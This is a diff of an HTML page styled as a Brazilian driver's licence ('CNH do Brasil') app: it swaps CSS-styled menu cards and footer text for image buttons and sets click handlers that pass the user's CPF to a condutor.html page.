@@ -155,69 +155,28 @@
             width: 100%;
             max-width: 600px;
             margin: 0 auto;
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
         }
 
-        .card-placeholder {
+        .card-img-btn {
             width: 100%;
-            height: 110px;
-            border-radius: 16px;
-            margin-bottom: 15px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            padding: 20px;
-            color: white;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.08);
+            height: auto;
+            display: block;
             cursor: pointer;
             transition: transform 0.1s;
-            text-decoration: none;
+            border-radius: 16px;
         }
 
-        .card-placeholder:active {
+        .card-img-btn:active {
             transform: scale(0.98);
-        }
-
-        .card-condutor {
-            background: linear-gradient(135deg, #00a859 0%, #008543 100%);
-        }
-
-        .card-veiculos {
-            background: linear-gradient(135deg, #f5a623 0%, #e09010 100%);
-            color: #0f172a;
-        }
-
-        .card-infracoes {
-            background: linear-gradient(135deg, #203468 0%, #132247 100%);
-        }
-
-        .card-educacao {
-            background: linear-gradient(135deg, #4a90e2 0%, #2170d1 100%);
-        }
-
-        .card-title {
-            font-size: 20px;
-            font-weight: 800;
-            text-transform: uppercase;
-            letter-spacing: -0.5px;
-        }
-
-        .card-sub {
-            font-size: 12px;
-            margin-top: 4px;
-            opacity: 0.9;
-        }
-
-        .card-icon {
-            font-size: 32px;
-            padding: 10px;
-            background: rgba(255, 255, 255, 0.15);
-            border-radius: 12px;
         }
 
         .footer-logos {
             display: flex;
             align-items: center;
-            justify-content: space-around;
+            justify-content: center;
             padding: 20px 15px 30px;
             background-color: #f5f7fa;
             width: 100%;
@@ -226,8 +185,10 @@
         }
 
         .footer-logos img {
-            max-height: 28px;
-            object-contain: contain;
+            max-width: 100%;
+            height: auto;
+            max-height: 55px;
+            object-fit: contain;
         }
     </style>
 </head>
@@ -273,43 +234,14 @@
     </div>
 
     <div class="app-content">
-        <a id="linkCondutor" href="#" class="card-placeholder card-condutor">
-            <div>
-                <div class="card-title">CONDUTOR</div>
-                <div class="card-sub">Gerencie sua habilitação</div>
-            </div>
-            <div class="card-icon"><i class="fas fa-car"></i></div>
-        </a>
-
-        <a id="linkVeiculos" href="#" class="card-placeholder card-veiculos">
-            <div>
-                <div class="card-title">VEÍCULOS</div>
-                <div class="card-sub">Acesso ao CRLV-e, venda digital</div>
-            </div>
-            <div class="card-icon" style="background: rgba(0,0,0,0.1);"><i class="fas fa-car-side"></i></div>
-        </a>
-
-        <div class="card-placeholder card-infracoes" onclick="msgRestrita()">
-            <div>
-                <div class="card-title">INFRAÇÕES</div>
-                <div class="card-sub">Visualize e pague infrações com até 40% de desconto</div>
-            </div>
-            <div class="card-icon"><i class="fas fa-shield-alt"></i></div>
-        </div>
-
-        <div class="card-placeholder card-educacao" onclick="msgRestrita()">
-            <div>
-                <div class="card-title">EDUCAÇÃO</div>
-                <div class="card-sub">Conheça nossa plataforma de cursos</div>
-            </div>
-            <div class="card-icon"><i class="fas fa-graduation-cap"></i></div>
-        </div>
+        <img id="btnCondutor" src="img/cnh-app/IMG_CONDUTOR.png" alt="CONDUTOR" class="card-img-btn">
+        <img id="btnVeiculos" src="img/cnh-app/IMG_VEICULOS.png" alt="VEÍCULOS" class="card-img-btn">
+        <img src="img/cnh-app/IMG_INFRACOES.png" alt="INFRAÇÕES" class="card-img-btn" onclick="msgRestrita()">
+        <img src="img/cnh-app/IMG_EDUCACAO.png" alt="EDUCAÇÃO" class="card-img-btn" onclick="msgRestrita()">
     </div>
 
     <div class="footer-logos">
-        <img src="img/logo.png" alt="Serpro" style="height: 22px;">
-        <span style="font-weight: 700; color: #002e6e; font-size: 14px;">CNH <span style="color: #008f43;">do</span> BRASIL</span>
-        <img src="img/logo_cnh.png" alt="Ministério dos Transportes" style="height: 22px;">
+        <img src="img/cnh-app/IMG_2343.png" alt="Serpro - CNH do Brasil - Ministério dos Transportes - Governo do Brasil">
     </div>
 
     <script>
@@ -332,8 +264,9 @@
 
         async function carregarDados() {
             const cleanCpf = cpf.replace(/\D/g, '');
-            document.getElementById('linkCondutor').href = "condutor.html?cpf=" + encodeURIComponent(cleanCpf);
-            document.getElementById('linkVeiculos').href = "condutor.html?cpf=" + encodeURIComponent(cleanCpf);
+            const targetUrl = "condutor.html?cpf=" + encodeURIComponent(cleanCpf);
+            document.getElementById('btnCondutor').onclick = () => window.location.href = targetUrl;
+            document.getElementById('btnVeiculos').onclick = () => window.location.href = targetUrl;
 
             if (!cleanCpf) return;
 
